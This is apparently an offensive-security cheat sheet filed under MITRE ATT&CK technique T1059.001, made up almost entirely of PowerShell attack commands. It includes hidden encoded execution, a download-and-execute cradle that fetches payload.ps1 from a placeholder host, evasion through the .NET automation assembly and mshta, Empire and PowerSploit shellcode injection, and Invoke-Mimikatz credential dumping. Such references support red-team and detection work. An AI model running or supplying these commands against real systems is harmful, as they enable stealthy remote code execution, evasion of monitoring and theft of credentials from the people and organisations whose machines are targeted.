# T1059.001 - PowerShell (tooling)

Related ATT&CK context: several examples below also overlap with credential
access, ingress tool transfer, remote services, or signed binary proxy execution.

## Direct PowerShell

```powershell
# Encoded command execution (bypass execution policy)
powershell -nop -w hidden -enc <base64-encoded-command>

# Download and execute (memory-only)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<host>/payload.ps1')"

# Execute via .NET automation assembly (bypasses some logging)
powershell -c "[System.Management.Automation.PowerShell]::Create().AddScript('whoami').Invoke()"

# Execute via mshta (LOLBIN - no powershell.exe in process list)
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -nop -w hidden -enc <base64>"",0:close")
```

## Empire (Starkiller)

```
usemodule powershell/code_execution/invoke_shellcode
set Shellcode <base64>
execute
```

## PowerSploit

```powershell
Import-Module .\PowerSploit.ps1
Invoke-Shellcode -Shellcode @(0x90,0x90,...)
Invoke-Mimikatz -DumpCreds
```

```

```
